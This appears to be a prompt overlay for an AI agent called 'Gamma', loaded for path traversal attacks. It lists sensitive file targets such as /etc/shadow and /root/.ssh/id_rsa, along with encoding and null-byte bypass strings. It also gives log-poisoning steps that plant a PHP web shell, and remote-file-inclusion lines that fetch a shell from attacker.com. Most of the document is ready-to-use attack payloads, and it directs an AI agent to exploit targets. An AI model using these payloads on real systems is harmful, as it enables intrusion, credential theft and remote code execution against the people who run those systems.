# Path Traversal — Dynamic Overlay

## Metadata
- **Exploit Type**: path_traversal
- **Applies To**: Gamma
- **Loading**: Appended when `exploit_type === "path_traversal"`

---

## OVERLAY_CONTEXT

Path traversal (LFI/RFI) exploits improper input validation in file access operations. Success indicators: reading sensitive files (/etc/passwd, config files), log poisoning, or remote code execution via file inclusion.

---

## File Read Payloads

### Linux
```
/etc/passwd
/etc/shadow (if readable)
/etc/hosts
/etc/fstab
/var/log/apache2/access.log
/var/log/nginx/access.log
/proc/self/environ
/proc/[pid]/cmdline
/home/.ssh/authorized_keys
/root/.ssh/id_rsa
```

### Windows
```
C:\windows\system32\drivers\etc\hosts
C:\windows\win.ini
C:\boot.ini
C:\xampp\apache\conf\httpd.conf
C:\Program Files\Apache Tomcat\conf\server.xml
```

---

## Encoding & Bypass Variants

### Double Encoding
```
..%252F..%252Fetc%252Fpasswd
```

### Null Byte Injection
```
../../etc/passwd%00.jpg
```

### Unicode
```
..%c0%af..%c0%afetc%c0%afpasswd
```

### Path Truncation
```
../../../etc/passwd/././././. or ../../../etc/passwd.... or ../../../etc/passwd\x2F
```

### Alternative Base Directories
```
/var/www/../../../etc/passwd
/home/user/../../etc/passwd
```

---

## Log Poisoning

### Apache/Nginx Log Poisoning
```
# Inject PHP payload via User-Agent
User-Agent: <?php system($_GET['cmd']); ?>
# Then include the log file
?file=/var/log/apache2/access.log
```

### SSH Auth Log Poisoning
```
ssh '<?php system($_GET["cmd"]); ?>'@target
# Then include auth log
?file=/var/log/auth.log
```

---

## Remote File Inclusion (RFI)

### Basic RFI
```
?file=http://attacker.com/shell.txt
?file=https://attacker.com/shell.txt
```

### PHP Expect Wrapper
```
?file=expect://whoami
```

---

## Constraints

```
- For RFI: ensure your server is reachable from the target
- Log poisoning requires writable logs and file inclusion
- Null bytes only work on older PHP versions
- Path traversal in download endpoints: check Content-Disposition header
- Don't modify or delete files — read-only access only
```

---

*Overlay version: 1.0*
